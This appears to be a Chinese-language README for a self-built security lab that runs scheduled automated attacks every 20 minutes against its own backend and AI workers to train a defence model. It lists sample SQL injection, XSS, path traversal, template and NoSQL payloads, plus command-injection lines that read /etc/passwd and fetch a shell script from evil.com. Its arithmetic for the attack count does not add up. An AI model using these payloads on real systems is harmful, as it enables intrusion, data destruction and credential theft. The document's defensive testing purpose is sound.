# 🕒 定時自動攻擊功能 - 已啟用

## 狀態：✅ 運行中

**更新時間**: 2025-11-11 09:35

---

## 📋 功能概述

HexStrike Worker 現已配置為**每 20 分鐘自動執行一次最全面和最深入的安全測試攻擊**。

### Cron 配置
```
*/20 * * * *  # 每 20 分鐘執行一次
```

這意味著攻擊會在：
- 00:00, 00:20, 00:40
- 01:00, 01:20, 01:40
- ... (以此類推，全天候 24/7)

---

## 🔥 攻擊規模

### 每次自動攻擊包含：

#### 1. **攻擊類型** (10 種)
1. **SQL Injection** (20 種變體)
   - 基礎 SQL Injection
   - Union-based
   - Time-based Blind
   - Boolean-based Blind
   - Stacked Queries
   - Advanced Evasion

2. **XSS** (17 種變體)
   - Basic XSS
   - IMG Tag XSS
   - Event Handler XSS
   - SVG XSS
   - Advanced XSS
   - Obfuscated XSS
   - DOM-based XSS

3. **DoS** (4 種變體)
   - Large Payloads (10K-500K 字符)
   - Malformed Payloads
   - Recursive JSON
   - XML Bomb

4. **Path Traversal** (13 種變體)
   - Unix/Linux 路徑
   - Windows 路徑
   - Advanced Evasion
   - Null Byte Injection

5. **Command Injection** (10 種變體)
   - Basic Command Injection
   - Advanced Command Injection
   - Time-based Command Injection

6. **LDAP Injection** (5 種變體)

7. **XML Injection** (2 種變體)
   - XXE (XML External Entity)

8. **NoSQL Injection** (5 種變體)
   - MongoDB 操作符注入

9. **Header Injection** (3 種變體)
   - HTTP Response Splitting

10. **Template Injection** (7 種變體)
    - Jinja2, EJS, ERB 等模板引擎

#### 2. **攻擊目標** (2 個)
- Backend Worker
- AI Worker

#### 3. **總攻擊次數（每 20 分鐘）**
- **10 種攻擊類型** × **86 種變體** × **2 個目標**
- **= 172 次攻擊請求**
- **每次攻擊間隔**: 100-200ms
- **總執行時間**: 約 17-34 秒

#### 4. **每日攻擊量**
- **每小時**: 3 次 × 172 = 516 次攻擊
- **每天**: 72 次 × 172 = **12,384 次攻擊**
- **每週**: 504 次 × 172 = **86,688 次攻擊**
- **每月**: ~2,160 次 × 172 = **~371,520 次攻擊**

---

## 🎯 攻擊載荷詳情

### SQL Injection 載荷範例
```sql
-- 基礎攻擊
' OR '1'='1
' OR 1=1--
admin'--

-- Union 攻擊
' UNION SELECT NULL, username, password FROM users--

-- Time-based Blind
'; WAITFOR DELAY '00:00:05'--
' OR SLEEP(5)--

-- Stacked Queries
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacker', 'password')--

-- 高級逃逸
%27%20OR%20%271%27%3D%271
' /**/OR/**/1=1--
/*!50000OR*/1=1--
```

### XSS 載荷範例
```html
<!-- 基礎 XSS -->
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

<!-- IMG XSS -->
<img src=x onerror=alert('XSS')>
<img/src/onerror=alert(1)>

<!-- SVG XSS -->
<svg onload=alert('XSS')>
<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>

<!-- 混淆 XSS -->
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

### 其他攻擊類型
```bash
# Command Injection
; ls -la
| cat /etc/passwd
; wget http://evil.com/shell.sh

# Path Traversal
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
../../../etc/passwd%00

# Template Injection
{{7*7}}
${7*7}
{{config.items()}}

# NoSQL Injection
{'$gt': ''}
{'$ne': null}
{$where: 'sleep(5000)'}
```

---

## 🔗 測試端點

### 1. 查看 Worker 狀態
```bash
curl https://unified-hexstrike.pcleegood.workers.dev/health
```

### 2. 手動觸發全面攻擊（測試用）
```bash
curl https://unified-hexstrike.pcleegood.workers.dev/attack/comprehensive
```

**⚠️ 警告**: 這會立即執行 172 次攻擊，需要 17-34 秒完成。

### 3. 查看攻擊統計
```bash
curl https://unified-hexstrike.pcleegood.workers.dev/attack/stats
```

### 4. 訪問攻擊控制台
打開瀏覽器：
```
https://unified-hexstrike.pcleegood.workers.dev/dashboard
```

---

## 📊 監控和日誌

### 查看實時日誌
```bash
wrangler tail unified-hexstrike
```

### 查看 Backend 防禦日誌
```bash
# 攻擊日誌
curl https://unified-backend.pcleegood.workers.dev/logs

# 統計數據
curl https://unified-backend.pcleegood.workers.dev/stats

# Dashboard
https://unified-backend.pcleegood.workers.dev/dashboard
```

### 查看 D1 資料庫
```bash
# 總攻擊數
wrangler d1 execute security-platform-db \
  --command "SELECT COUNT(*) FROM attack_logs" \
  --remote

# 按類型統計
wrangler d1 execute security-platform-db \
  --command "SELECT attack_type, COUNT(*) as count FROM attack_logs GROUP BY attack_type ORDER BY count DESC" \
  --remote

# 最近攻擊
wrangler d1 execute security-platform-db \
  --command "SELECT * FROM attack_logs ORDER BY timestamp DESC LIMIT 20" \
  --remote
```

---

## ⏰ 定時任務管理

### 查看 Cron 狀態
在 Cloudflare Dashboard 中：
1. 進入 **Workers & Pages**
2. 選擇 **unified-hexstrike**
3. 查看 **Triggers** 標籤
4. 可以看到 Cron Trigger: `*/20 * * * *`

### 修改執行頻率

如需更改執行頻率，編輯 `wrangler-hexstrike.toml`:

```toml
[triggers]
crons = ["*/20 * * * *"]  # 目前：每 20 分鐘

# 其他選項：
# crons = ["*/15 * * * *"]  # 每 15 分鐘
# crons = ["*/30 * * * *"]  # 每 30 分鐘
# crons = ["0 * * * *"]     # 每小時整點
# crons = ["0 */2 * * *"]   # 每 2 小時
# crons = ["0 0 * * *"]     # 每天午夜
```

然後重新部署：
```bash
cd infrastructure/cloud-configs/cloudflare
wrangler deploy --config wrangler-hexstrike.toml
```

### 暫時停用定時攻擊

如需暫時停用，註解掉 cron 配置：

```toml
# [triggers]
# crons = ["*/20 * * * *"]
```

然後重新部署。

---

## 🛡️ 防禦系統整合

### Backend Worker 會：
1. **檢測**每次攻擊
2. **記錄**到 D1 資料庫
3. **呼叫** AI Worker 進行威脅評分
4. **採取**防禦動作（block/allow/challenge）

### AI Worker 會：
1. **分析**攻擊模式
2. **計算**威脅分數
3. **訓練** ML 模型
4. **建議**防禦策略

### 預期效果：
- 初期：較低的阻擋率（~30-40%）
- 訓練後：逐步提升（目標 85-95%）
- 持續學習：自動適應新攻擊模式

---

## 📈 效能影響

### Cloudflare Workers 配額（Free Plan）
- **請求數**: 100,000 次/天
  - 定時攻擊使用：~12,384 次/天（12.4%）
  - 剩餘配額：~87,616 次/天
  
- **CPU 時間**: 10ms/請求
  - 每次攻擊：~5-10ms
  - 總 CPU 時間：~2-4 分鐘/天

### D1 資料庫配額（Free Plan）
- **讀取**: 500 萬次/天（充足）
- **寫入**: 10 萬次/天
  - 攻擊日誌：~12,384 次/天（12.4%）
  - 防禦記錄：~12,384 次/天（12.4%）
  - 總使用：~24,768 次/天（24.8%）

### 建議
- ✅ Free Plan 可以支撐當前負載
- ⚠️ 如果添加更多攻擊類型，考慮升級到 Paid Plan
- 💡 可以調整 cron 頻率以控制使用量

---

## 🎮 Dashboard 新功能

訪問 https://unified-hexstrike.pcleegood.workers.dev/dashboard

### 新增按鈕
- **💀 全面深度攻擊（所有工具）**
  - 立即執行 172 次攻擊
  - 包含所有 10 種攻擊類型
  - 使用所有 86 種載荷變體

### 狀態顯示
- **⏰ 定時攻擊已啟用**: 每 20 分鐘自動執行全面深度攻擊

---

## 🔧 技術細節

### Scheduled Event Handler
```javascript
export default {
  async scheduled(event, env, ctx) {
    console.log('🕒 Scheduled attack triggered at:', new Date().toISOString());
    
    const results = await executeComprehensiveAttack(env);
    console.log('✅ Comprehensive attack completed:', results);
  }
}
```

### 攻擊執行邏輯
1. 遍歷所有目標（backend, ai）
2. 對每個目標執行所有攻擊類型
3. 對每種攻擊使用所有載荷變體
4. 每次攻擊間隔 100-200ms
5. 記錄結果和統計數據
6. 輸出到日誌

---

## ✅ 驗證定時任務

### 方法 1: 等待自動執行
- 等到下一個 20 分鐘整點（如 09:40, 10:00, 10:20）
- 查看日誌：`wrangler tail unified-hexstrike`
- 應該看到 "🕒 Scheduled attack triggered" 訊息

### 方法 2: 手動觸發測試
```bash
curl https://unified-hexstrike.pcleegood.workers.dev/attack/comprehensive
```

### 方法 3: 查看 Cloudflare Dashboard
- 進入 Workers & Pages > unified-hexstrike
- 查看 Metrics 標籤
- 應該看到每 20 分鐘一次的請求峰值

---

## 🚨 注意事項

1. **⚠️ 生產環境使用**
   - 確保 Backend 和 AI Workers 能處理高負載
   - 監控 D1 資料庫大小
   - 定期清理舊日誌

2. **📊 資料管理**
   - 建議每週/每月清理舊攻擊日誌
   - 保留統計數據用於 ML 訓練
   - 備份重要數據

3. **🔒 安全考量**
   - 這是測試環境，不要對外部系統使用
   - 所有攻擊都記錄在案
   - 確保合法合規使用

---

## 📚 相關文檔

- **部署指南**: `DEPLOYMENT_GUIDE.md`
- **部署成功報告**: `DEPLOYMENT_SUCCESS.md`
- **實作完成報告**: `IMPLEMENTATION_COMPLETE.md`
- **Wrangler 配置**: `infrastructure/cloud-configs/cloudflare/wrangler-hexstrike.toml`
- **Worker 代碼**: `infrastructure/cloud-configs/cloudflare/src/hexstrike-worker.js`

---

## 🎉 總結

✅ **定時攻擊功能已完全啟用並運行**

- ⏰ 每 20 分鐘自動執行
- 🔥 172 次攻擊/次
- 💾 12,384 次攻擊/天
- 📊 完整日誌記錄
- 🤖 ML 持續學習
- 🛡️ 自主防禦提升

**系統狀態**: 🟢 **全面運行中** - 24/7 持續安全測試

---

*功能啟用時間: 2025-11-11 09:35*
*下次自動攻擊: 每 20 分鐘（:00, :20, :40）*
*Worker URL: https://unified-hexstrike.pcleegood.workers.dev*

